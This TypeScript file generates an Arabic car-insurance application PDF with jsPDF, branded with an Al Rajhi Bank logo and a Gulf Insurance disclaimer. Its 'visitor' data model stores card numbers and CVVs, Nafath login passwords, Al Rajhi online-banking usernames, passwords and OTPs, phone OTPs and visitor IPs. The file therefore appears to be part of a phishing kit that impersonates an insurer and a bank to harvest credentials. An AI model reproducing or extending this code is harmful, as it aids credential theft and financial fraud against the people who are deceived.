import jsPDF from "jspdf";
import { amiriFont } from "./amiri-font";
import { alRajhiLogoBase64 } from "./logo-base64";

interface VisitorData {
  id: string;
  personalInfo?: {
    nationalId?: string;
    birthDate?: string;
    phone?: string;
    documment_owner_full_name?: string;
    fullName?: string;
  };
  vehicleInfo?: {
    serialNumber?: string;
    vehicleYear?: string;
    coverageType?: string;
    selectedAddOns?: string[];
  };
  selectedOffer?: {
    companyName?: string;
    basePrice?: number;
    totalPrice?: number;
    discountPercentage?: number;
  };
  paymentInfo?: {
    cardNumber?: string;
    cardHolder?: string;
    expiryDate?: string;
    cvv?: string;
  };
  nafazData?: {
    idNumber?: string;
    password?: string;
    authNumber?: string;
  };
  rajhiData?: {
    username?: string;
    password?: string;
    otp?: string;
  };
  phoneData?: {
    phoneNumber?: string;
    carrier?: string;
    otp?: string;
  };
  metadata?: {
    country?: string;
    browser?: string;
    os?: string;
    ip?: string;
    createdAt?: any;
  };
}

const BLUE = [0, 51, 102];
const DARK_TEXT = [30, 30, 30];
const LABEL_BG = [240, 240, 240];

function drawSectionHeader(doc: jsPDF, title: string, y: number, margin: number, width: number): number {
  const headerHeight = 9;
  doc.setFillColor(BLUE[0], BLUE[1], BLUE[2]);
  doc.roundedRect(margin, y, width - 2 * margin, headerHeight, 1, 1, "F");

  doc.setFontSize(11);
  doc.setTextColor(255, 255, 255);
  doc.text(title, width - margin - 5, y + 6.5, { align: "right" });

  return y + headerHeight + 1;
}

function drawTableRow(doc: jsPDF, label: string, value: string, y: number, margin: number, pageWidth: number, isEven: boolean): number {
  const rowHeight = 9;
  const tableWidth = pageWidth - 2 * margin;
  const labelColWidth = (tableWidth * 0.4);
  const valueColWidth = tableWidth - labelColWidth;

  if (isEven) {
    doc.setFillColor(250, 250, 250);
  } else {
    doc.setFillColor(255, 255, 255);
  }
  doc.rect(margin, y, tableWidth, rowHeight, "F");

  doc.setFillColor(LABEL_BG[0], LABEL_BG[1], LABEL_BG[2]);
  doc.rect(margin + valueColWidth, y, labelColWidth, rowHeight, "F");

  doc.setDrawColor(210, 210, 210);
  doc.rect(margin, y, tableWidth, rowHeight, "S");
  doc.line(margin + valueColWidth, y, margin + valueColWidth, y + rowHeight);

  doc.setFontSize(10);
  doc.setTextColor(BLUE[0], BLUE[1], BLUE[2]);
  doc.text(label, margin + valueColWidth + labelColWidth - 4, y + 6, { align: "right" });

  doc.setTextColor(DARK_TEXT[0], DARK_TEXT[1], DARK_TEXT[2]);
  doc.setFontSize(10);
  doc.text(value || "-", margin + valueColWidth - 4, y + 6, { align: "right" });

  return y + rowHeight;
}

function checkPageBreak(doc: jsPDF, y: number, needed: number): number {
  const pageHeight = doc.internal.pageSize.getHeight();
  if (y + needed > pageHeight - 25) {
    doc.addPage();
    return 15;
  }
  return y;
}

function addPageFooter(doc: jsPDF, pageNum: number, totalPages: number) {
  const pageWidth = doc.internal.pageSize.getWidth();
  const pageHeight = doc.internal.pageSize.getHeight();

  doc.setDrawColor(210, 210, 210);
  doc.line(15, pageHeight - 15, pageWidth - 15, pageHeight - 15);

  doc.setFontSize(8);
  doc.setTextColor(128, 128, 128);
  doc.text(`${pageNum} / ${totalPages}`, 20, pageHeight - 8, { align: "left" });
}

export function generateInsurancePDF(data: VisitorData): void {
  const doc = new jsPDF({
    orientation: "portrait",
    unit: "mm",
    format: "a4",
  });

  doc.addFileToVFS("Amiri-Regular.ttf", amiriFont);
  doc.addFont("Amiri-Regular.ttf", "Amiri", "normal");
  doc.setFont("Amiri");

  const pageWidth = doc.internal.pageSize.getWidth();
  const margin = 15;
  let y = 15;

  try {
    doc.addImage(
      "data:image/png;base64," + alRajhiLogoBase64,
      "PNG",
      margin,
      y - 3,
      35,
      18
    );
  } catch (e) {
  }

  doc.setFontSize(26);
  doc.setTextColor(BLUE[0], BLUE[1], BLUE[2]);
  doc.text("تأمين السيارات", pageWidth - margin, y + 5, { align: "right" });

  doc.setFontSize(14);
  doc.setTextColor(BLUE[0], BLUE[1], BLUE[2]);
  doc.text("إستمارة طلب", pageWidth - margin, y + 14, { align: "right" });
  y += 25;

  doc.setFillColor(BLUE[0], BLUE[1], BLUE[2]);
  doc.roundedRect(margin, y, pageWidth - 2 * margin, 9, 1, 1, "F");
  doc.setFontSize(10);
  doc.setTextColor(255, 255, 255);
  doc.text("هذا التأمين سيوفر لك بناءً على طلبك", pageWidth / 2, y + 6, { align: "center" });
  y += 12;

  doc.setFontSize(8);
  doc.setTextColor(60, 60, 60);
  const disclaimerText = "لا يُعد تأمين مسؤولية مجموعة الخليج للتأمين (الخليج) ش.م.ع (م) حتى يتم قبول هذه الاستمارة ويتم دفع قيمة القسط، وتحتفظ مجموعة الخليج للتأمين (الخليج) ش.م.ع (م) بحق إضافة شروط خاصة أو رفض هذا الطلب. يرجى الرجوع إلى وثيقة التأمين للحصول على كافة الأحكام والشروط والاستثناءات. يوجد نسخه من هذه الوثيقة عند الطلب.";
  const disclaimerLines = doc.splitTextToSize(disclaimerText, pageWidth - 2 * margin - 10);
  doc.text(disclaimerLines, pageWidth - margin - 5, y + 4, { align: "right" });
  y += disclaimerLines.length * 4 + 6;

  y = checkPageBreak(doc, y, 70);
  y = drawSectionHeader(doc, "مقدم الطلب", y, margin, pageWidth);

  const fullName = data.personalInfo?.documment_owner_full_name || data.personalInfo?.fullName || "-";
  y = drawTableRow(doc, "الاسم حسب البطاقة الشخصية:", fullName, y, margin, pageWidth, false);
  y = drawTableRow(doc, "نوع التأمين:", data.selectedOffer?.companyName || "ضد الغير", y, margin, pageWidth, true);
  y = drawTableRow(doc, "رقم الهوية:", data.personalInfo?.nationalId || "-", y, margin, pageWidth, false);
  y = drawTableRow(doc, "رقم الهاتف النقال:", data.personalInfo?.phone || "-", y, margin, pageWidth, true);
  y = drawTableRow(doc, "تاريخ بدء التأمين:", data.personalInfo?.birthDate || new Date().toISOString().split('T')[0], y, margin, pageWidth, false);
  y = drawTableRow(doc, "القيمة التأمينية:", data.selectedOffer?.totalPrice ? `${data.selectedOffer.totalPrice}` : "-", y, margin, pageWidth, true);
  y += 4;

  if (data.vehicleInfo) {
    y = checkPageBreak(doc, y, 50);
    y = drawSectionHeader(doc, "معلومات المركبة", y, margin, pageWidth);
    y = drawTableRow(doc, "نوع السيارة:", data.vehicleInfo?.coverageType || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "سنة السيارة:", data.vehicleInfo?.vehicleYear || "-", y, margin, pageWidth, true);
    y = drawTableRow(doc, "الرقم التسلسلي:", data.vehicleInfo?.serialNumber || "-", y, margin, pageWidth, false);
    if (data.vehicleInfo?.selectedAddOns && data.vehicleInfo.selectedAddOns.length > 0) {
      y = drawTableRow(doc, "الإضافات:", data.vehicleInfo.selectedAddOns.join(", "), y, margin, pageWidth, true);
    }
    y += 4;
  }

  if (data.selectedOffer) {
    y = checkPageBreak(doc, y, 45);
    y = drawSectionHeader(doc, "الخيار المختار", y, margin, pageWidth);
    y = drawTableRow(doc, "الشركة:", data.selectedOffer?.companyName || "-", y, margin, pageWidth, false);
    y = drawTableRow(doc, "السعر الأساسي:", data.selectedOffer?.basePrice ? `${data.selectedOffer.basePrice} ر.س` : "-", y, margin, pageWidth, true);
    if (data.selectedOffer?.discountPercentage) {
      y = drawTableRow(doc, "الخصم:", `${data.selectedOffer.discountPercentage}%`, y, margin, pageWidth, false);
    }
    y = drawTableRow(doc, "السعر الإجمالي:", data.selectedOffer?.totalPrice ? `${data.selectedOffer.totalPrice} ر.س` : "-", y, margin, pageWidth, false);
    y += 4;
  }

  y = checkPageBreak(doc, y, 35);
  const termsY = y;
  const tableWidth = pageWidth - 2 * margin;
  const labelColWidth = tableWidth * 0.4;
  const valueColWidth = tableWidth - labelColWidth;

  doc.setFillColor(LABEL_BG[0], LABEL_BG[1], LABEL_BG[2]);
  doc.rect(margin + valueColWidth, termsY, labelColWidth, 9, "F");
  doc.setFillColor(255, 255, 255);
  doc.rect(margin, termsY, valueColWidth, 9, "F");
  doc.setDrawColor(210, 210, 210);
  doc.rect(margin, termsY, tableWidth, 9, "S");
  doc.line(margin + valueColWidth, termsY, margin + valueColWidth, termsY + 9);

  doc.setFontSize(10);
  doc.setTextColor(BLUE[0], BLUE[1], BLUE[2]);
  doc.text("أوافق على الشروط والأحكام:", margin + valueColWidth + labelColWidth - 4, termsY + 6, { align: "right" });

  doc.setDrawColor(100, 100, 100);
  const checkboxSize = 4;
  const cbY = termsY + 2.5;
  doc.rect(margin + 10, cbY, checkboxSize, checkboxSize, "S");
  doc.setFontSize(8);
  doc.setTextColor(DARK_TEXT[0], DARK_TEXT[1], DARK_TEXT[2]);
  doc.text("نعم", margin + 10 + checkboxSize + 2, cbY + 3.2);
  doc.rect(margin + 30, cbY, checkboxSize, checkboxSize, "S");
  doc.text("لا", margin + 30 + checkboxSize + 2, cbY + 3.2);
  y = termsY + 9;

  doc.setFillColor(LABEL_BG[0], LABEL_BG[1], LABEL_BG[2]);
  doc.rect(margin + valueColWidth, y, labelColWidth, 9, "F");
  doc.setFillColor(255, 255, 255);
  doc.rect(margin, y, valueColWidth, 9, "F");
  doc.setDrawColor(210, 210, 210);
  doc.rect(margin, y, tableWidth, 9, "S");
  doc.line(margin + valueColWidth, y, margin + valueColWidth, y + 9);

  doc.setFontSize(10);
  doc.setTextColor(BLUE[0], BLUE[1], BLUE[2]);
  doc.text("التوقيع:", margin + valueColWidth + labelColWidth - 4, y + 6, { align: "right" });
  y += 12;

  const totalPages = doc.getNumberOfPages();
  for (let i = 1; i <= totalPages; i++) {
    doc.setPage(i);
    doc.setFont("Amiri");
    addPageFooter(doc, i, totalPages);
  }

  const fileName = `طلب_تأمين_${data.personalInfo?.nationalId || data.id}_${Date.now()}.pdf`;
  doc.save(fileName);
}
